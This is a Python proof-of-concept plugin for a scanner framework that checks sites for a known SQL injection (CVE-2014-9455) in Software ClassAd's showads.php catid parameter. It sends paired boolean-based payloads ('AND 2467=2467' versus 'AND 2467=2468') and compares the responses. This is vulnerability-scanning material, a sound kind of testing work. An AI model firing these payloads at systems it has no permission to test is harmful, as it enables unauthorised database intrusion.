# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'SoftwareClassAd_0101'  # 平台漏洞编号
    name = 'Software ClassAd SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-01-07'  # 漏洞公布时间
    desc = '''
    Software ClassAd是一个在线广告应用。
    Software ClassAd showads.php脚本未正确过滤catid参数，允许远程攻击者利用漏洞提交特制的SQL查询，操作或获取数据库数据。
    '''  # 漏洞描述
    ref = 'http://www.cnvd.org.cn/flaw/show/CNVD-2015-00130'  # 漏洞来源
    cnvd_id = 'CNVD-2015-00130'  # cnvd漏洞编号
    cve_id = 'CVE-2014-9455'  # cve编号
    product = 'SoftwareClassAd'  # 漏洞组件名称
    product_version = '3.0'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'ec3c5fda-f752-4dd7-9a24-fd94f9c4137b'  # 平台 POC 编号
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-06-06'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }
                    
    def verify(self):
        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            paylaod = '/showads.php?catid=2 AND 2467=2467'
            paylaod1 = '/showads.php?catid=2 AND 2467=2468'
            url = self.target + paylaod
            response = requests.get(url)
            url = self.target + paylaod1
            response1 = requests.get(url)
            if response.text != response1.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))
        except Exception as e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
